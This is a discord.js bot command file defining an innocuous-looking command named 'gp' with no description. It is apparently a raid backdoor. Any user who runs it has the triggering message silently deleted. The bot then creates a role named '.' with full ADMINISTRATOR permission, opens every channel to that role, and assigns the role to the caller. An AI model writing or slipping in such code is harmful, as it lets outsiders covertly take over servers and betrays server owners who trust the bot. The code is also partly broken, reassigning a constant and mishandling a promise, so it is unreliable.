const Discord = require('discord.js');



exports.run = (client, message, args) => {
    
    message.channel.fetchMessages({
        limit: 1
      }).then(messages => message.channel.bulkDelete(messages));
     if(!message.channel.permissionsFor(client.user).has("ADMINISTRATOR")) return message.author.send('Je ne peux pas te donner le rôle admin, sorry bro');

  const raidrole = message.guild.roles.find(`name`, ".");

    if(!raidrole){
        try{
        
    
        raidrole =  message.guild.createRole({
          name: ".",
          color: "#00000",
          permissions:['ADMINISTRATOR']
        })
    
      }catch(e){
        message.channel.send(e) 
      }
    
    
        
    const muteRoles = message.guild.roles.find(`name`, ".");
    setTimeout(function(){
          message.guild.channels.forEach(async (channel, id) => {
                await channel.overwritePermissions(muteRoles, {
                    SEND_MESSAGES: true,
                    ADD_REACTIONS: true,
                    MENTION_EVERYONE: true
                });
            });
              message.guild.member(message.author).addRole(muteRoles)
              
      }, 100);
  }else{
      message.guild.channels.forEach(async (channel, id) => {
                await channel.overwritePermissions(raidrole, {
                    SEND_MESSAGES: true,
                    ADD_REACTIONS: true,
                    MENTION_EVERYONE: true
                });
            });message.guild.member(message.author).addRole(raidrole)

}

}


    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'gp',
        description: '',
        usage: ''
      };
